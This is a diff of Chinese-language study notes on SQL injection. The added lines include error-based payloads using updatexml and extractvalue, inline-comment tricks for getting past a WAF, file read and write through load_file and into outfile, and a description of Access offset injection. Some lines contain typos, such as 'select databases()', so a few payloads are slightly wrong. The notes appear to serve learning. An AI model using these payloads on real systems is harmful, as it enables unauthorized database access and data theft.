@@ -38,7 +38,7 @@ orderby 判断字段数和显示位置（报错注入）
 
 ​	User-Agent:'updatexml(xml_document,xpath_string_new_value)->(XML文档名称,xpath字符串,替换查找到的符合条件的数据)
 
-​						' and updatexml(1,concat()0x7e,(select @@version),0x7e,1) or '1'='1'
+​						'AND updatexml(1,concat(0x7e,(select databases()),0x7e),1) or '1'='1'
 
 ​		IP
 
@@ -74,11 +74,24 @@ mysql（关系型数据库）
 		limit
 		select load_file("path")
 		select into outfile 'E:\\PATH\\www\\'
-		注释：#，-- ，--+，
+
+updataxml->updatexml(1,concat(0x7e,(select database()),0x7e),1)
+
+extractvalue->extractvalue(1,concat(0x7e,database(),0x7e))
+
+注释：#，-- ，--+，
 
 ​		多行注释 /**/
 
 ​      内联注释/*！SQL语句*/常用来绕过WAF 
+
+<u>asp+access </u>    aceess偏移注入
+
+​	原理：利用数据库的自连接查询让数据库内部发生乱序，从而偏移出所需要的字段显示在面上，不能100%成功
+
+场景：知道Access数据库中的表明，但是得不到字段的sql注入（字段取名复杂，无法暴力破解）
+
+流程：1.判断字段数（order by）  2.判断表明union select * from   开始偏移注入
 
 # bapass
 
